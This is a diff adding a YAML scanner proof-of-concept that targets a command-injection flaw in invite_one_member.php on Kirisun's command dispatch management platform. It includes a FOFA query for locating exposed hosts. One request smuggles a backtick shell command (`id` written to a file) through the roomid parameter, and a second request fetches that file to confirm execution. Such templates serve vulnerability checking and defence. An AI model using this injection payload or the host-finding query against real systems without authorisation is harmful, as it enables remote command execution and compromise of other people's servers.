@@ -1,0 +1,34 @@
+id: poc-yaml-kirisun-invite-one-member-php-command-injection
+info:
+  name: 福建科立讯通信 指挥调度管理平台 invite_one_member.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: 科立讯指挥调度管理平台
+  fofa: body="指挥调度管理平台"
+variables:
+  t1: random_str(4)
+requests:
+- method: GET
+  path: /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>{{.t1}}.txt`
+  expression: 'status_code == 200 &&
+
+    contains(body,"id") &&
+
+    !contains(body,"<")
+
+    '
+- method: GET
+  path: /api/client/audiobroadcast/{{.t1}}.txt
+  expression: 'status_code == 200 &&
+
+    contains(body,"uid=") &&
+
+    contains(body,"gid=") &&
+
+    contains(body,"groups=") &&
+
+    !contains(body,"<")
+
+    '
+transport: http
